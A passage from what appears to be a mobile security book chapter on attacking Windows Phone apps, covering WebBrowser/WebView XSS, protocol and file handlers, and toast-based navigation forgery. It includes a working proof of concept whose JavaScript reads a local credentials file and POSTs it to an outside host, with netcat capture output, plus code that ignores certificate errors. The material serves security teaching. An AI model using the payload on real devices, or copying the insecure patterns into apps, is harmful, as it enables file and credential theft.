    "question": "What are the common data entry points in Windows Phone applications that can be exploited by attackers, and how can they be identified and analyzed?",
    "summary": "This chapter discusses methods for analyzing Windows Phone applications, including reverse engineering, code review, and examining security features like exploit mitigation. It also covers common vulnerabilities in various components such as WebBrowser/WebView controls, Bluetooth, HTTP sessions, and transport security issues. Additionally, it explains how to identify and exploit entry points through protocols, file extensions, and interprocess communication mechanisms."
  },
  {
    "start": 59,
    "end": 65,
    "text": "review and when using manual testing, because traffic will pass through a proxy, whereas the SSL negotiation\nprocess should fail if certificate checking occurred!\nApps may also add ignore settings for other certificate errors, such as:\nfilter.IgnorableServerCertificateErrors.Add(\nChainValidationResult.IncompleteChain);\nfilter.IgnorableServerCertificateErrors.Add(\nChainValidationResult.WrongUsage);\nfilter.IgnorableServerCertificateErrors.Add(\nChainValidationResult.InvalidName);\nfilter.IgnorableServerCertificateErrors.Add(\nChainValidationResult.RevocationInformationMissing);\nfilter.IgnorableServerCertificateErrors.Add(\nChainValidationResult.RevocationFailure);\nCertificate validation in System.Net.Http.HttpClient, however, cannot be disabled using any publicly\ndocumented method.\nAttacking WebBrowser and WebView Controls\nWe mentioned earlier that WebBrowser controls can represent an entry point and source of vulnerabilities in\nthird-party apps. Use of WebBrowser controls in Windows Phone apps is common, so we’ll now discuss\npotential security problems that can result from not using them carefully.\nCross-Site Scripting\nBecause WebBrowser and WebView controls are a subset of browser functionality embedded into a Windows\nPhone app, it’s probably no surprise that they could be vulnerable to cross-site scripting (XSS).\nTo create a WebBrowser control within a page of an application, developers insert (manually or using their IDE)\nsomething similar to the following into the page’s XAML file:\n<phone:WebBrowser HorizontalAlignment=\"Left\" Margin=\"20,50,0,0\"\nName=\"myWebBrowser\"\nVerticalAlignment=\"Top\" Height=\"500\" Width=\"430\" />\nWithin their codebase, developers may then use their embedded WebBrowser control, whose object name is\nmyWebBrowser.\nLikewise, in Windows Phone 8.1 apps, to embed a WebView within a page, XAML similar to the following could\nbe used:\n<WebView x:Name=\"myWebView\"\nHeight=\"425\"\nHorizontalAlignment=\"Stretch\"\nVerticalAlignment=\"Stretch\"\nScrollViewer.ZoomMode=\"Disabled\"\nScrollViewer.VerticalScrollBarVisibility=\"Disabled\"\nLoaded=\"webView_Loaded\"\nNavigationFailed=\"webView_NavigationFailed\"\nNavigationCompleted=\"webView_NavigationCompleted\"\nVisibility=\"Visible\"/>\nYou could then instruct the control (in both WebView and WebBrowser cases) programmatically to load a page, say\nwww.google.co.uk, with code such as the following:\nmyWebBrowser.Source = new Uri(\"http://www.google.co.uk\",\nUriKind.Absolute);\nor\nmyWebBrowser.Navigate(new Uri(\"http://www.google.co.uk\",\nUriKind.Absolute));\nA very important point to note is that these code fragments load a standard http:// URL, in particular,\nhttp://www.google.co.uk. Because the HTTP session takes place over an unsecured channel, the connection is\nultimately vulnerable to man-in-the-middle attacks, and moreover, injection into the HTTP response stream\nthat will be received and parsed by the WebBrowser control. If the control had been instructed toward\nhttps://www.google.co.uk, a man-in-the-middle attack would be particularly difficult, and an attacker would be\nunable to inject any data into the HTTP response returning to the WebBrowser or WebView. (SSL API\nimplementation vulnerabilities aside!)\nNow, suppose an attacker managed a man-in-the-middle attack on the targeted device (think public, guest, and\ncoffee shop Wi-Fi). One might assume that he could simply inject malicious JavaScript into www.google.co.uk’s\nresponse, and launch some kind of attack against the user. Or, suppose an attacker carried out a persistent\n(stored) cross-site scripting attack on the site the control is navigated to.\nThe preceding assumption is quite correct, when JavaScript is enabled on the WebBrowser control in question.\nBy default, WebBrowser and WebView controls have JavaScript disabled, but developers often enable JavaScript\njust because their app or the plumbing of that particular interface relies on it.\nThe are two ways JavaScript can be enabled on an embedded WebBrowser are programmatically and in the page’s\nXAML file.\nCarrying on with the hypothetical myWebBrowser object, you could use the following line of code to enable\nJavaScript execution:\nmyWebBrowser.IsScriptEnabled = true;\nIn programmatic enablement, it’s as simple as setting a Boolean named IsScriptEnabled to true.\nEnabling JavaScript when actually declaring the WebBrowser control in the page’s XAML file is also possible, as\nin the following markup:\n<phone:WebBrowser HorizontalAlignment=\"Left\" Margin=\"20,50,0,0\"\nName=\"myWebBrowser\" IsScriptEnabled=\"True\"\nVerticalAlignment=”Top” Height=”500” Width=”430” /> Note that WebView controls do not automatically\nexecute JavaScript that is present in rendered pages; instead, the app must instruct the control to execute\nfunctions using the InvokeScript or InvokeScriptAsync functions. For example:\nawait myWebView.InvokeScriptAsync(\"myFunction\", null);\nBoth the WebBrowser and WebView classes also feature a method named NativeToString(). Feeding an\nattacker-controlled string into this function also represents a script execution vector, such as the following:\nmyWebBrowser.NavigateToString(attackerControlledHTMLString);\nWebBrowser and WebView controls should ideally use https:// as opposed to http:// URLs wherever possible.\nThis is even truer if the control has JavaScript enabled on it. Whether JavaScript is enabled or not, lack of SSL\non the connection should be considered against best practices. Equally, attacker controllable strings should\nnever be passed to the NavigateToString() method.\nEven when the loaded page is just publicly accessible content, SSL should still be used. Smartphone users are\ngenerally quite prone to man-in-the-middle attacks, because joining open Wi-Fi networks when out and about,\nsuch as public hotspots, and hotel and other guest Wi-Fi networks, is common. GPRS (General Packet Radio\nService) and other cellular technologies are also prone to man-in-the-middle attacks that facilitate injection into\nnon-SSL sessions. This is in contrast to desktop or laptop use, where users tend to use secured Wi-Fi or wired\nconnections, and can often be fairly confident that local eavesdropping is somewhat unlikely.\nPossible attacks could involve injecting JavaScript, which renders a convincing fake interface in the embedded\nWebBrowser or WebView, such as providing a prompt for the user’s PIN, password, or other sensitive\ninformation, which could then be sent back to the attacker’s web server.\nLocal Scripting Attacks\nOccasionally, an application may deliberately save a web page to a file, or dynamically generate\nHTML/JavaScript content, and likewise save the content to a file.\nIf an attacker can influence the contents of the locally saved HTML file in an arbitrary way, serious security\nissues can arise due to the same-origin policy (SOP). Although a full description of SOP is beyond the scope of\nthis book, the key purpose of SOP is to prevent a script running in one host’s context from requesting content\nfrom another host, and being able to read it. This violates the same-origin policy and is the reason a web page\ncannot make a request to your online banking site and read the response, which may contain sensitive details\nsuch as your balance and recent transactions.\nThe same-origin policy holds true for all (modern) web browsers; JavaScript running on hostA.com cannot\nmake an AJAX request (for example) to hostB.com and read the response, because the two pieces of content are\nnot from the same origin.\nHowever, when a page is loaded from the local filesystem, other files on the system are from the same origin, or\nthe local zone. This effectively means that if a local file is loaded into a WebBrowser control, JavaScript within it\nis actually able to request other local files on the filesystem (within sandboxing constraints) and access their\ncontents, because this in line with the same-origin policy. This was first documented by Alex Plaskett and Nick\nWalker (https://labs.mwrinfosecurity.com/system/assets/651/original/mwri_wp8_appsec-whitepaper-\nsyscan_2014-03-30.pdf).\nThis fact should set off alarm bells; if an app writes an HTML file to disk that contains attacker-controlled\nJavaScript, the attacker can steal files from the device, within WP8.x’s sandboxing constraints.\nDemonstrating this is straightforward to do by putting together a simple app that contains a WebBrowser that\nloads a local file. The local file, in this demo, contains JavaScript that loads a local file named\ncredentialsFile.txt in an iframe; the JavaScript then POSTs these contents to another host. This other host, in\na real attacker scenario, would be under the control of the attacker.\nTo carry out the attack, a particular protocol handler will be used to open the local file: x-wmapp0:. This protocol\nhandler allows demonstration of the attack perfectly—file://secretFile.txt, on the other hand, will not work.\nFor the sake of proof-of-concept, follow these steps that demonstrate that local script execution can indeed\naccess and steal local files within the app’s sandbox.\n1. In Visual Studio Express 2012 for Windows Phone, create a new project of type Windows Phone HTML5\nApp.\n2. In MainPage.xaml, insert the following:\n<phone:PhoneApplicationPage\nx:Class=\"HTML5App1.MainPage\"\nxmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\nxmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\nxmlns:phone=\"clr-\nnamespace:Microsoft.Phone.Controls;assembly=Microsoft.Phone\"\nxmlns:shell=\"clr-\nnamespace:Microsoft.Phone.Shell;assembly=Microsoft.Phone\"\nxmlns:d=\"http://schemas.microsoft.com/expression/blend/2008\"\nxmlns:mc=\"http://schemas.openxmlformats.org/markup-compatibility/2006\"\nmc:Ignorable=\"d\"\nFontFamily=\"{StaticResource PhoneFontFamilyNormal}\"\nFontSize=\"{StaticResource PhoneFontSizeNormal}\"\nForeground=\"{StaticResource PhoneForegroundBrush}\"\nSupportedOrientations=\"Portrait\" Orientation=\"Portrait\"\nshell:SystemTray.IsVisible=\"True\">\n<!--LayoutRoot is the root grid where all page content is placed-->\n<Grid x:Name=\"LayoutRoot\" Background=\"Transparent\">\n<phone:WebBrowser x:Name=\"Browser\"\nHorizontalAlignment=\"Stretch\"\nVerticalAlignment=\"Stretch\"\nLoaded=\"Browser_Loaded\"\nNavigationFailed=\"Browser_NavigationFailed\" />\n</Grid>\n<!-- ApplicationBar -->\n<phone:PhoneApplicationPage.ApplicationBar>\n<shell:ApplicationBar IsVisible=\"True\"\nIsMenuEnabled=\"True\" Mode=\"Minimized\">\n<shell:ApplicationBarIconButton\nIconUri=\"/Assets/AppBar/appbar.back.rest.png\"\nIsEnabled=\"True\" Text=\"back\" Click=\"BackApplicationBar_Click\"/>\n<shell:ApplicationBarIconButton\nIconUri=\"/Assets/AppBar/appbar.next.rest.png\"\nIsEnabled=\"True\" Text=\"forward\"\nClick=\"ForwardApplicationBar_Click\"/>\n<shell:ApplicationBar.MenuItems>\n<shell:ApplicationBarMenuItem Text=\"home\"\nClick=\"HomeMenuItem_Click\" />\n</shell:ApplicationBar.MenuItems>\n</shell:ApplicationBar>\n</phone:PhoneApplicationPage.ApplicationBar>\n</phone:PhoneApplicationPage>\n3. In MainPage.xaml.cs, insert the following C# code:\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Net;\nusing System.Windows;\nusing System.Windows.Controls;\nusing System.Windows.Navigation;\nusing Microsoft.Phone.Controls;\nusing Microsoft.Phone.Shell;\nnamespace HTML5App1\n{\npublic partial class MainPage : PhoneApplicationPage\n{\n// Url of Home page\nprivate string MainUri = \"/Html/index.html\";\n// Constructor\npublic MainPage()\n{\nInitializeComponent();\n}\nprivate void Browser_Loaded(object sender, RoutedEventArgs e)\n{\n// Add your URL here\n//Browser.Navigate(new Uri(\n\"http://www.google.co.uk\", UriKind.Absolute));\nBrowser.IsScriptEnabled = true;\nBrowser.Navigate(new Uri(MainUri, UriKind.Relative));\n}\n// Navigates back in the web browser's navigation stack, not the\napplications.\nprivate void BackApplicationBar_Click(object sender,\nEventArgs e)\n{\nBrowser.GoBack();\n}\n// Navigates forward in the web browser's navigation stack,\n//not the applications.\nprivate void ForwardApplicationBar_Click(object sender,\nEventArgs e)\n{\nBrowser.GoForward();\n}\n// Navigates to the initial \"home\" page.\nprivate void HomeMenuItem_Click(object sender, EventArgs e)\n{\n// Browser.Navigate(new Uri(\"http://www.google.co.uk\",\nUriKind.Absolute));\nBrowser.IsScriptEnabled = true;\nBrowser.Navigate(new Uri(MainUri, UriKind.Relative));\n}\n// Handle navigation failures.\nprivate void Browser_NavigationFailed(object sender,\nSystem.Windows.Navigation.NavigationFailedEventArgs e)\n{\nMessageBox.Show(\"Navigation to this page failed\");\n}\n}\n}\n4. In Solution Explorer, open Html/index.html and insert the following HTML and JavaScript:\n<!DOCTYPE html>\n<html>\n<body onload=\"getIframeContent('testFrame');\">\n<iframe id=\"testFrame\" src=\"x-wmapp0:credentialsFile.txt\" >\n</iframe>\n</body>\n<script>\nfunction getIframeContent(frameId) {\nvar frameObj = document.getElementById(frameId);\nvar frameContent = frameObj.contentWindow.document.body.innerHTML;\nvar x = new XMLHttpRequest();\nx.open('POST','http://10.0.0.29:8000',true);\ntry { x.send(frameContent);\n} catch (e) { // error\n}\n}\n</script>\n</html>\nChange http://10.0.0.29:8000 to the IP address of your test laptop or desktop box.\n5. Using Solution Explorer, right-click the project name and go to Add New Item Text File and insert the\nfollowing contents into it.\nusername: adminUser\npassword: secretPwd123\n6. Rename the file to credentialsFile.txt.\n7. Set up a netcat listener on your test box; that is, $ nc -l 8000.\n8. Run the app on your device or emulator, and observe the traffic in your netcat listener:\n$ nc -l 8000\nPOST / HTTP/1.1\nAccept: */*\nAccept-Language: en-GB\nContent-Type: text/plain;charset=UTF-8\nUA-CPU: ARM\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0;\nTrident/6.0; IEMobile/10.0; ARM; Touch; SAMSUNG; GT-I8750)\nHost: 10.0.0.29:8000\nContent-Length: 53\nConnection: Keep-Alive\nCache-Control: no-cache\n<pre>username: adminUser\npassword: secretPwd123</pre>\nHence, the file was submitted to our fake web server, which is quite worrisome, and a good indicator of the\ndangers of local scripting!\nThis method, using the x-wmapp0 file handler, can be used to retrieve any file within the app’s sandboxing\nrestraints. Practically, this means anywhere in an app’s IsolatedStorage and anywhere within the app’s Install\ndirectory. That is, more specifically:\nC:\\Data\\programs\\{GUID}\\Install\\*—All files installed with the bundle\nC:\\Data\\Users\\DefApps\\APPDATA\\{GUID}\\*—The app’s IsolatedStorage/Local directory\nBecause file disclosure is likely to represent a serious vulnerability in sensitive apps (such as banking, secure\nBring Your Own Device containers, and so on), you should take great care if your app writes influenced data to a\nfile to be rendered in a WebBrowser or WebView context later.\nJavaScript-C# Communication\nThe possibility exists for JavaScript running in WebBrowser and WebView controls to pass data back to the\napplication’s C# layer. This can be a useful tool, particularly for developers who choose to implement much of\nan app’s logic in JavaScript.\nYou achieve communication between the JavaScript and C# layers by implementing a WebBrowser or WebView\nscript notification event handler. You do this using the ScriptNotify parameter in the control’s XAML tag. For a\nWebBrowser control, this may look like:\n<phone:WebBrowser x:Name=\"Browser\" ScriptNotify=\"myEventHandler\"\nHorizontalAlignment=\"Stretch\"\nVerticalAlignment=\"Stretch\"\nLoaded=\"Browser_Loaded\"\nNavigationFailed=\"Browser_NavigationFailed\" />\nAnd for a WebView control, similarly:\n<WebView x:Name=\"myWebView\"\nHeight=\"425\"\nHorizontalAlignment=\"Stretch\"\nVerticalAlignment=\"Stretch\"\nScrollViewer.ZoomMode=\"Disabled\"\nScrollViewer.VerticalScrollBarVisibility=\"Disabled\"\nScriptNotify=\"myEventHandler\"\nLoaded=\"webView_Loaded\"\nNavigationFailed=\"webView_NavigationFailed\"\nNavigationCompleted=\"webView_NavigationCompleted\"\nVisibility=\"Visible\"/>\nThe application will define the script notification callback:\nprivate void myEventHandler(object sender, NotifyEventArgs e) {\nMessageBox.Show(e.Value);\n}\nJavaScript executing in a WebBrowser or WebView control may then pass a value into the event handler\n(myEventHandler()) using the window.external.notify() API:\nwindow.external.notify(\"value passed in from JS\");\nPredictably, in the previous example, the message box would display the \"value passed in from JS\" string.\nDevelopers should not assume that values passed in (e.Value in the previous example) from the JavaScript\nlayer are safe because the possibility exists that attacker-controlled JavaScript may be executing the\nWebBrowser or WebView control via one route or another (such as man-in-the-middle), and so values passed in\nvia script notification handlers should be treated with caution and not blindly trusted.\nWhat an app actually does with values passed in from JavaScript will vary from app to app. When WebBrowser\nand WebView control XAML definitions have a ScriptNotify parameter present, reviewing the handler carefully\nto see whether any risk exists if an attacker does manage to inject a window.external .notify()call into the\nWebBrowser or WebView’s content is worth your time.\nIdentifying Interprocess Communication Vulnerabilities\nInterprocess communication (IPC) mechanisms were briefly introduced previously in this chapter. Use of IPC\nmechanisms allow two completely separate apps to launch other apps, and communicate with apps offering IPC\ninterfaces, often to pass information between the two, or to influence or use part of another app’s functionality\nin some way.\nWe’ve already mentioned the two types of IPC that the Windows Phone 8.x OSes support: file extension\nhandlers and protocol handlers. This section covers each of these two mechanisms and shows how they are\nimplemented in real applications, and how, as a result, an attacker may be able to interact with another\napplication and possibly exploit weaknesses or vulnerabilities in an app.\nProtocol Handlers\nApplications declare the scheme for their URL handler in their main manifest file. In apps targeted to work on\nboth Windows Phone 8 and 8.1, this will be WMAppManifest.xml. A typical definition for a sample scheme\n(myproto:) would generally take the following form:\n<Protocol Name=\"myproto\" NavUriFragment=\"encodedLaunchUri=%s\"\nTaskID=\"_default\" />\nThen, upon installation of the app, assuming the URL scheme is not already taken, the OS registers the scheme\nto the app in question.\nIf an app is only targeted at Windows Phone 8.1, that is, it is an APPX package, the protocol handler declaration\nwill be inside the Package.appxmanifest file, and may look something like this:\n<Extension Category=\"windows.protocol\" EntryPoint=\"xxxx\">\n<Protocol Name=\"myproto\">\n<Logo>test.jpg</Logo>\n<DisplayName>myproto</DisplayName>\n</Protocol>\n</Extension>\nA handler must then be implemented to act as the entry point for when the app launches due to some outside\nsource invoking a myproto: URL. You do this quite simply by implementing the UriMapperBase interface (see\nhttp://msdn.microsoft.com/en-us/library/windows/apps/jj206987(v=vs.105) .aspx#BKMK_URIassociations):\nclass myUriMapper : UriMapperBase\n{\nprivate string fullUri;\npublic override Uri MapUri(Uri myUri) {\nfullUri = HttpUtility.UrlDecode(myUri.ToString());\nif(fullUri.Contains(\"myproto:\")) {\n// get data after \"myproto:\" scheme\nstring data = fullUri.IndexOf(\"myproto:\") + 8;\n// do something useful with data\n}\n}\n}\nThe preceding code URL-encodes the entire URL that was invoked, and then checks it for the presence of the\nURL scheme that we’re interested in handling in this case (because an app may register for and deal with more\nthan one URL scheme). If myproto: is present, a reference to all data after the myproto: string is given to the\ndata variable, and then the app is free to parse the rest of the data and use it in whatever way it pleases.\nAlthough this example handler doesn’t actually do any useful work, consider an example for a hypothetical VoIP\napplication that has a URL handler named myvoip: and initiates a call automatically every time its URL scheme\nis invoked with a phone number:\nclass myUriMapper : UriMapperBase\n{\nprivate string fullUri;\npublic override Uri MapUri(Uri myUri) {\nfullUri = HttpUtility.UrlDecode(myUri.ToString());\nif(fullUri.Contains(\"myvoip:CallNumber?number=\")) {\n// get phone number\nstring phoneNo = fullUri.IndexOf(\"number=\") + 7;\n// launch call screen with number\nreturn new Uri(\"/DoCall.xaml?phoneNumber=\" +\nphoneNo, UriKind.Relative);\n}\nreturn myUri; // else launch normally\n}\n}\nThis VoIP URL handler extracts the phone number passed to the handler and then maps the request to the\nDoCall.xaml page, passing the phone number with it. The implementation code for the DoCall.xaml page\n(DoCall .xaml.cs) takes the phone number passed in and automatically initiates a phone call to it.\nWhen XAML pages are navigated to, as in the previous URL handler, its OnNavigatedTo method is called.\nParameters can be passed in the same way as standard URLs, as demonstrated previously when a phone number\nis passed into the page. DoCall.xaml.cs could have an implementation similar to the following:\nprotected override void OnNavigatedTo(NavigationEventArgs e) {\nstring phoneNumber;\nif (this.NavigationContext.QueryString.ContainsKey(\"phoneNumber\"))\n{\nphoneNumber = this.NavigationContext.QueryString[\"phoneNumber\"];\nbool ret = await DoVoIPCall(phoneNumber);\n}\n// other logic\nelse {\n[ ... ]\n}\n}\nThis functionality would be callable via an appropriately crafted invocation of myvoip:, such as\nmyvoip:CallNumber?number=12345678901, which results in the DoCall.xaml page being opened as in\nDoCall.xaml?phoneNumber=12345678901.\nYou can fairly easily see how a call being initiated without permission from the user could be a bad thing, and\nalthough this hypothetical case is just an example, it’s not detached from reality. In fact, a very popular VoIP\napplication was vulnerable to almost exactly the same bug: Its protocol handler allowed calls to be launched\nwithout prompting the user for permission. Issues with this liberal allowance for initiating calls could range\nfrom undesirably wasting a user’s calling credit, to effectively eavesdropping on a user’s real-life conversation by\ncalling a number owned by the attacker.\nConsider another example protocol handler, this time an application that in some place renders a web page in a\nWebBrowser control. This particular hypothetical application offers the ability to change the page that it renders\nin the WebBrowser:\nclass myUriMapper : UriMapperBase\n{\nprivate string fullUri;\npublic override Uri MapUri(Uri myUri) {\nfullUri = HttpUtility.UrlDecode(myUri.ToString());\nif(fullUri.Contains(\"myapp:ChangeSettings?homePage=\")) {\n// get phone number\nstring page = fullUri.IndexOf(\"homePage=\") + 9;\n// launch call screen with number\nreturn new Uri(\"/ChangeSettings.xaml?homePage=\"\n+ phoneNo, UriKind.Relative);\n}\nreturn myUri; // else launch the app normally\n}\n}\nHaving the ability to change the page rendered by an app’s WebBrowser control presents possible attack vectors,\nsuch as, phishing attacks via fake login screens, because WebBrowser controls do not actually show the URL of\nthe current page. Such functionality is conceivable, as well, because some apps may need to be able to update or\nchange the location to be rendered at will (for example, by a page that is being rendered in the WebBrowser in\nthe first place).\nOther attack scenarios could involve inclusion of data passed into dynamically generated web pages, SQL\ninjection, and other application-specific privileged or sensitive actions. When URL handlers are offered by an\napp, you should find out what action is taken. (For example, it is likely that the request is mapped to a XAML\npage.) You also need to ascertain what action occurs with any inputted data from there. (In this case, what\nhappens in OnNavigatedTo()?) Manual testing and code review are both viable options, with code review being\ngenerally preferred when original or reflected code has been gleaned.\nNow that we’ve discussed the basics of custom protocol handlers and how they could possibly present security\nrisks, it’s worth summarizing all the ways that URL handlers can be invoked, because this is ultimately what an\nattacker will be concerned with. In no particular order, they are:\nBy web pages being viewed in Internet Explorer or another web browser—This can be done either\nvia a hyperlink,\n<a href=myApp://abcd>click me</a>\nor via a URL scheme that is followed automatically, such as via an iframe, an event handler, or otherwise:\n<iframe id=\"testFrame\" src=\"myApp://abcd\" >\nThe user is not prompted for permission to launch the app.\nBy web pages in WebBrowser and WebView controls—This can be done either via a hyperlink,\n<a href=myApp://abcd>click me</a>\nor via a URL scheme that is followed automatically, such as via an iframe, an event handler, or otherwise:\n<iframe id=\"testFrame\" src=\"myApp://abcd\" >\nThe user is not prompted for permission to launch the app.\nBy other apps on the device—\nWindows.System.Launcher.LaunchUriAsync(new System.Uri(\n\"myApp://aaaaaaaa\"));\nThe user is not prompted for permission to launch the app.\nBy a nearby NFC device or tag—For example, from a proximate Windows Phone, other smartphone, or\nNFC tag:\nlong Id = device.PublishUriMessage(new System.Uri(\"myUrl:something\"));\nThe user is prompted for permission to accept and launch the URL—unless the app being launched was\nticked as trusted during a previous launch. Trusting an app to allow NFC URL launches is only available in\nWindows Phone 8.1, not 8.\nFile Handlers\nApplications can register to be associated with file extensions. Then, when a file bearing that file extension is\nopened on the device, the registered app launches and can make a copy of the file, open it, parse it, and\notherwise handle it in the way that it is designed. For example, a PDF viewer would register to be associated\nwith the .pdf file extension, and upon a PDF file being opened, the app would launch, parse the file, and attempt\nto render it.\nBecause many apps that register as file extension handlers parse the data found in opened files bearing their\nextension, the scope for interesting security bugs becomes quite apparent.\nAdditionally, files that are received via email or via browser downloads and then opened also result in file\nhandling behavior being honored, so file handlers offer avenues of attack for completely remote attackers if\nvulnerable apps are installed on a given device.\nAn app’s intention to be associated with one or more file extensions is declared in the manifest file, much as for\nprotocol handlers. If the app has been built and distributed for both Windows Phone 8 and 8.1 (that is, XAP),\nthis desire will be the WMAppManifest.xml file, and a sample app may register for the .myExt file extension using\nsome markup like the following:\n<Extensions>\n<FileTypeAssociation TaskID=\"_default\" Name=\"app\"\nNavUriFragment=\"fileToken=%s\">\n<Logos>\n<Logo Size=\"small\" IsRelative=\"true\">Assets/img_small.png\n</Logo>\n<Logo Size=\"medium\"\nIsRelative=\"true\">Assets/img_medium.png</Logo>\n<Logo Size=\"large\" IsRelative=\"true\">Assets/img_large.png\n</Logo>\n</Logos>\n<SupportedFileTypes>\n<FileType ContentType=\"application/myExt\">.myExt</FileType>\n</SupportedFileTypes>\n</FileTypeAssociation>\n</Extensions>\nIf the app targets only Windows Phone 8.1 and is therefore an APPX package, the file extension handler\ndeclaration will be located in the app’s Package .appxmanifest file, and may resemble this:\n<Extension Category=\"windows.fileTypeAssociation\">\n<FileTypeAssociation Name=\"myext\">\n<DisplayName>myExt</DisplayName>\n<SupportedFileTypes>\n<FileType ContentType=\"application/myext\">.myExt\n</FileType>\n</SupportedFileTypes>\n</FileTypeAssociation>\n</Extension>\nThe application must then register a handler to be called into when a file bearing the .myExt extension is\nopened. This is done in a similar manner as for protocol handlers: by implementing the UriMapperBase interface.\nA hypothetical app could contain the following code:\nnamespace sdkAutoLaunch\n{\nclass AssociationUriMapper : UriMapperBase\n{\nprivate string fullUri;\npublic override Uri MapUri(Uri uri)\n{\nfullUri = uri.ToString();\n// a file association launch\nif (fullUri.Contains(\"/FileTypeAssociation\"))\n{\n// Get the file ID\nint fileIDIndex = fullUri.IndexOf(\"fileToken=\") + 10;\nstring fileID = fullUri.Substring(fileIDIndex);\n// get the name of the file that was opened\nstring incomingFileName =\nSharedStorageAccessManager.GetSharedFileName(fileID);\n// Get the file ext of file that was opened\nstring incomingFileType =\nPath.GetExtension(incomingFileName);\n// switch case, we may have registered more than\n// one file extension\nswitch (incomingFileType)\n{\ncase \".myExt\":\nreturn new Uri(\"/ParseFile.xaml?fileToken=\"\n+ fileID, UriKind.Relative);\n// handle other file exts we reg'd for?\n// ...\ndefault:\nreturn new Uri(\"/MainPage.xaml\",\nUriKind.Relative);\n}\n}\nreturn uri; // else launch app normally\n}\n}\n}\nThis code receives a URL string (in the Uri parameter) of the form /FileTypeAssociation?fileToken={GUID};\nthis string is then parsed. Ultimately the app launches its ParseFile.xaml page and passes the file’s token to it,\nwhenever a .myExt file has been opened on the device.\nParseFile.xaml.cs could contain the following code, which copies the file from the OS’s shared storage space\ninto its own IsolatedStorage, opens it, and then begins parsing it:\nprotected override async void OnNavigatedTo(NavigationEventArgs e)\n{\nbase.OnNavigatedTo(e);\nif (NavigationContext.QueryString.ContainsKey(\"fileToken\"))\n{\n// copy the file from shared storage to our own sandboxed\n// storage space\nAwait SharedStorageAccessManager.CopySharedFileAsync(\nApplicationData.Current.LocalFolder, \"newFile.myExt\",\nNameCollisionOption.ReplaceExisting,\nNavigationContext.QueryString[\"fileToken\"]);\nvar file = await folder.GetFileAsync(\"newFile.myExt\");\n// open the file for reading\nusing (var fs = await file.OpenAsync(FileAccessMode.Read))\n{\nusing (var inStream = fs.GetInputStreamAt(0))\n{\nusing (var reader = new DataReader(inStream))\n{\nawait reader.LoadAsync((uint)fs.Size);\n// parse the file contents\nparseInputFile(reader);\n}\n}\n}\n}\n}\nThe details of what the hypothetical parser (in this case, the parseInputFile() method) actually does with the\nfile contents would be completely application dependent; however, many apps are likely to have registered their\nfile extension(s) so that they can parse, process, or otherwise use files of a certain type in a useful way. For\nexample, apps may register so that they act as the device’s PDF viewer or image viewer.\nOther apps may parse binary files in some way, or they may open the file, and then send it back to the\ndeveloper’s server for use, and perhaps do some parsing on it in between—think collecting telemetry statistics,\nlogs, or crash dumps. Whatever the case, designing secure file parsers can be difficult; homegrown file parsers\ndon’t exactly have a history for being very secure! Some mature apps from the desktop may have been ported to\nWindows Phone and may be using the desktop app’s parsing engine that was written in native code, via\nP/Invoke, which may spell trouble.\nAfter you’ve identified the code path that is followed when the registered file type is opened, it’s time to dig into\nthe parser or processor for bugs. You can do this using source code (original or reflected), or via some kind of\nfile format fuzzing.\nBefore concluding this section on protocol and file handlers, let’s look at the possible ways files can be\nlaunched:\nBy web pages being viewed in Internet Explorer—The user is not prompted for permission to launch\nthe app.\nBy web pages in WebBrowser and WebView controls—\nThe user is not prompted for permission to launch the app.\nFrom email attachments—The user is not prompted for permission to launch the app.\nBy other apps on the device—For example here the user is not prompted for permission to launch an app.\nStorageFolder local =\nWindows.Storage.ApplicationData.Current.LocalFolder;\nStorageFile bqfile = await local.GetFileAsync(\"file.theirExt\");\n// launch the file\nWindows.System.Launcher.LaunchFileAsync(bqfile);\nBy a nearby NFC device—For example from a proximate Windows Phone, other smartphone, or NFC tag.\nThe user is prompted for permission to accept and launch the file—unless the app being launched has been\n“ticked” as trusted during a previous launch. Trusting an app to allow NFC URL launches is only available in\nWindows Phone 8.1, not 8.\nFrom SD cards—This is a special case, and was discussed earlier in this chapter, see the earlier section “SD\nCards” under “Analyzing for Entry Points” for more information.\nToast Notifications\nToast notifications are small message bars that appear at the top of the screen to notify the user of an event.\nTypically, an app will publish a toast when something happens that the user may want to react to, such as\nreceiving an instant message.\nWhen an app sends a toast notification, it specifies which of its pages should be launched if the user chooses to\ntap the toast. The general idea is that upon tapping a toast, users should be taken to the page where they can act\nupon the event that the toast was informing them of. For example, following on from the previous instant\nmessage example, the toast may map them to an XAML page in the app where they can view the conversation\nand respond to the received message. If no specific XAML page is specified with a toast notification, the default\nbehavior is to take the user to the app’s main page.\nUsing Windows Phone’s standard API, ShellToast, applications are only able to send toast notifications that\nwhen tapped link to XAML pages within their own app. That is, URIs must be relative to the app, such as\n/MyXaml.xaml.\nIn Windows Phone 8 (not 8.1), however, this restriction can be bypassed by calling the underlying native API,\nShell_PostMessageToast(), which is exported by ShellChromeAPI.dll. That is to say, if an application crafts a\ncall to Shell_PostMessageToast() in the right way, a toast can be sent that when tapped launches an XAML page\nin a completely different app, parameters to the XAML page included. cpuguy disclosed and demonstrated this\non xda-developers.com, in a forum post located here at http://forum.xda-developers .com/showthread.php?\nt=2398275.\nSo, for example, a malicious app could send a toast via Shell_PostMessageToast() that when tapped launches\nVulnerablePage.xaml in another third-party app, with custom parameters; that is:\n/VulnerablePage.xaml?params=maliciousData\nIn this sense, toast notifications represent an interesting entry point in a similar way to protocol handlers—to\nenter into the OnNavigatedTo() method of an XAML page. However, unlike protocol handlers, which generally\nmap to hard-coded XAML pages, sending toasts allows entry into arbitrary XAML pages of other third-party apps\n—as long as the user taps the toast. Consider, for example, an XAML page that is responsible for making\nimportant configuration changes, which could be leveraged by coaxing an unsuspecting user into tapping a\nseemingly innocuous toast notification.\nXAML pages (and their implementation code) that are deliberately mapped via protocol handlers may be coded\ndefensively, because developers are aware that such well-exposed entry points are prime targets for attack.\nHowever, pages that developers never intended to be arbitrarily callable by anyone other than themselves may\nbe less secure. For example, some XAML page implementations may parse arguments and assume they are\ntrusted, because that page was not mapped via a protocol handler or any other means. Toasts provide a means\nfor attacking these.\nThis type of attack has been dubbed Cross-Application Navigation Forgery by Alex Plaskett and Nick Walker in\ntheir Windows Phone 8 security whitepaper\n(https://labs.mwrinfosecurity.com/system/assets/651/original/mwri_wp8_appsec-whitepaper-syscan_2014-\n03-30.pdf).\nThis exact attack is what allowed all 